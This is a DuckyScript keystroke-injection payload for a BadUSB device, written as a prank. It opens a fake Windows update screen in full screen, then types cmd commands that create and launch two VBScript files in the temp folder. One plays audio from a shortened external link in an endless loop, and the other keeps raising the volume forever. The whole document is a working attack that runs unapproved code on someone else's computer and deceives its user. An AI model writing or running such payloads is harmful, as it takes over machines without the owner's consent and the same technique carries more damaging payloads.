REM Trick user into thinking theres an update before rickroll
DELAY 3000
GUI r 
DELAY 100 
STRING https://fakeupdate.net/win10ue/ 
ENTER 
DELAY 3000 
F11
DELAY 3500
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING del %tmp%\roll.vbs
ENTER
DELAY 200
STRING del %tmp%\vol.vbs
ENTER
DELAY 200
STRING cd %tmp% && copy con roll.vbs
ENTER
STRING While true
ENTER
STRING Dim oPlayer
ENTER
STRING Set oPlayer = CreateObject("WMPlayer.OCX")
ENTER
STRING oPlayer.URL = "http://tinyurl.com/s63ve48"
ENTER
STRING oPlayer.controls.play
ENTER
STRING While oPlayer.playState <> 1 ' 1 = Stopped
ENTER
STRING WScript.Sleep 100
ENTER
STRING Wend
ENTER
STRING oPlayer.close
ENTER
STRING Wend
ENTER
DELAY 100
CTRL z
ENTER
STRING copy con vol.vbs
ENTER
STRING do
ENTER
STRING Set WshShell = CreateObject("WScript.Shell")
ENTER
STRING WshShell.SendKeys(chr(&hAF))
ENTER
STRING loop
ENTER
CTRL z
ENTER
STRING start roll.vbs && vol.vbs
ENTER
STRING exit
ENTER
